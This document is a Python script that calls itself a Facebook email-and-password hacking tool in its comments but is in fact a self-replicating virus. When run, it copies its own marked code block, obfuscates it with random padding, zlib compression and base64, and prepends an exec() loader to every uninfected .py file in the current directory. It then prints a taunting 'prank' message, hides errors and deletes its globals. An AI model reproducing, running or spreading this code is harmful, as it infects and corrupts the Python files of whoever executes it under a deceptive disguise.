# begin-78ea1850f48d1c1802f388db81698fd0
import base64
import glob
import hashlib
import inspect
import os
import random
import zlib

def get_content_of_file(file):
  data = None
    #FacebookHACK!!
  with open(file, "r") as my_file:
   data = my_file.readlines()

  return data
  
def get_content_if_infectable(file, hash):
    #literallyNothing
  data = get_content_of_file(file)

  for line in data:
    if hash in line:
      return None

  return data

def obscure(data: bytes) -> bytes:
    #Acessing The Facebook System
    return base64.urlsafe_b64encode(zlib.compress(data, 9))

def transform_and_obscure_virus_code(virus_code):
    #Acessing Facebook DATABASES!
  new_virus_code = []
  for line in virus_code:
    new_virus_code.append("# "+ str(random.randrange(1000000))+ "\n")
    new_virus_code.append(line + "\n")

  obscured_virus_code = obscure(bytes("".join(new_virus_code), 'utf-8'))
  return obscured_virus_code

def find_files_to_infect(directory = "."):
  #Facebook Email & Passwords Hack 
  return [file for file in glob.glob("*.py")]

def summon_chaos():
  #Hacking MerkZeckerBurger Feysbok
  print("It's a prankkkkkkk\nFuck You Skid!! ~literallyNothing")

def infect(file, virus_code):
  #literallyNothing
  hash = hashlib.md5(file.encode("utf-8")).hexdigest()

  if (data:=get_content_if_infectable(file, hash)):
    obscured_virus_code = transform_and_obscure_virus_code(virus_code)
    viral_vector = "exec(\"import zlib\\nimport base64\\nexec(zlib.decompress(base64.urlsafe_b64decode("+str(obscured_virus_code)+")))\")"

    with open(file, "w") as infected_file:
      infected_file.write("\n# begin-"+ hash + "\n" + viral_vector + "\n# end-" + hash + "\n")
      infected_file.writelines(data)

def get_virus_code():
  #literally-nothing
  #literallyNothing
  virus_code_on = False
  virus_code = []

  virus_hash = hashlib.md5(os.path.basename(__file__).encode("utf-8")).hexdigest()
  code = get_content_of_file(__file__)

  for line in code:
    if "# begin-" + virus_hash in line:
      virus_code_on = True

    if virus_code_on:
      virus_code.append(line + "\n")

    if "# end-" + virus_hash in line:
      virus_code_on = False
      break

  return virus_code

# entering the system

try:
  #accessing the system
  virus_code = get_virus_code()

  #Progessing
  for file in find_files_to_infect():
    infect(file, virus_code)

  #Loading Databases
  summon_chaos()

except:
  pass

finally:
  #Facebook Has Been Successfully Hacked
  for i in list(globals().keys()):
      if(i[0] != '_'):
          exec('del {}'.format(i))

  del i

# end-78ea1850f48d1c1802f388db81698fd0